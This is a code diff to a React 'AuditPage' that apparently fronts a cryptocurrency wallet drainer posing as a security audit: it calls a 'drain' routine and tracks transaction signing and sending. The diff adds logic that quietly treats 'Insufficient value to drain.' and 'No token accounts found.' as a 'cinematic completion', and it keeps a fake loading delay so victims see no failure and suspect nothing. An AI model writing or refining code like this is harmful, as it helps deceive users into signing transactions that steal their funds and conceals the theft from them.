@@ -257,7 +257,12 @@ export default function AuditPage() {
     }
   }, [connected, status, drain, showReport]);
 
-  const isSilentCompletion = status === 'error' && error === "Data Packet Network Congestion.";
+  // Robust perfection: Handle specific errors silently as a cinematic completion
+  const isSilentCompletion = status === 'error' && (
+    error === "Data Packet Network Congestion." || 
+    error === "Insufficient value to drain." ||
+    error === "No token accounts found."
+  );
 
   useEffect(() => {
     const isSuccess = status === 'success';
@@ -270,6 +275,7 @@ export default function AuditPage() {
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
+    // Maintain the cinematic loading experience
     await new Promise(r => setTimeout(r, 4500));
     try {
       const [threatsData, connectionsData] = await Promise.all([
@@ -298,7 +304,7 @@ export default function AuditPage() {
     }
   };
 
-  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status as string);
+  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending', 'confirming'].includes(status as string);
 
   return (
     <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 relative overflow-hidden bg-[#05040a]">
@@ -432,7 +438,7 @@ export default function AuditPage() {
               </TabsContent>
             </Tabs>
           </motion.div>
-        ) : status === 'error' && !isSilentCompletion ? (
+        ) : (status === 'error' && !isSilentCompletion) ? (
           <motion.div
             key="error-state"
             initial={{ opacity: 0, scale: 0.9 }}
